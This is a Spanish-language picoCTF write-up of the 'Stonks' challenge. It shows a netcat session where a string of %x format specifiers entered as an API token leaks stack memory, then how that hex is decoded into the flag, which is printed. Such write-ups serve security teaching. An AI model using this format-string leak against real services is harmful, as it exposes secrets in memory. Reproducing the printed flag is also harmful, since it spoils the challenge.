# 05-Stonks

## Objetivo
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/fdf270d959fa5231e180e2bd11421d0c/vuln.c) `nc mercury.picoctf.net 16439`

## Pistas

| No. Pista | Pista                                               |
| --------- | --------------------------------------------------- |
| 1         | Okay, maybe I'd believe you if you find my API key. |

## Solucion
```bash
┌──(kali㉿kali)-[~/Documentos/binary]
└─$ nano vuln.c.1              
                                                                                       
┌──(kali㉿kali)-[~/Documentos/binary]
└─$ nc mercury.picoctf.net 16439
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x
Buying stonks with token:
942a3d0
Portfolio as of Mon Nov 25 22:00:32 UTC 2024


3 shares of NSQ
3 shares of DWIN
15 shares of L
46 shares of XRJ
146 shares of S
87 shares of MM
1488 shares of V
Goodbye!
                                                                                       
┌──(kali㉿kali)-[~/Documentos/binary]
└─$ nc mercury.picoctf.net 16439
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%        
Buying stonks with token:
93cb450804b00080489c3f7f0cd80ffffffff193c9160f7f1a110f7f0cdc7093ca180193cb43093cb4506f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6263376365616336ffea007df7f47af8f7f1a440df89da0010f7da9ce9f7f1b0c0f7f0c5c0f7f0c000ffeaa4c8f7d9a68df7f0c5c08048ecaffeaa4d40
Portfolio as of Mon Nov 25 22:03:19 UTC 2024


1 shares of F
1 shares of S
7 shares of U
7 shares of VJN
1 shares of ONJC
2 shares of IRI
1 shares of WXSR
4 shares of M
67 shares of Y
215 shares of LF
32 shares of X
Goodbye!
```
93cb450804b00080489c3f7f0cd80ffffffff193c9160f7f1a110f7f0cdc7093ca180193cb43093cb4506f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6263376365616336ffea007df7f47af8f7f1a440df89da0010f7da9ce9f7f1b0c0f7f0c5c0f7f0c000ffeaa4c8f7d9a68df7f0c5c08048ecaffeaa4d40

* Lo pasamos a CyberChef (FromHex)(Swap Endianness)
* Quitamos los 4 primeros digitos
* Apareceria la bandera

picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae}

## Notas adicionales

## Referencias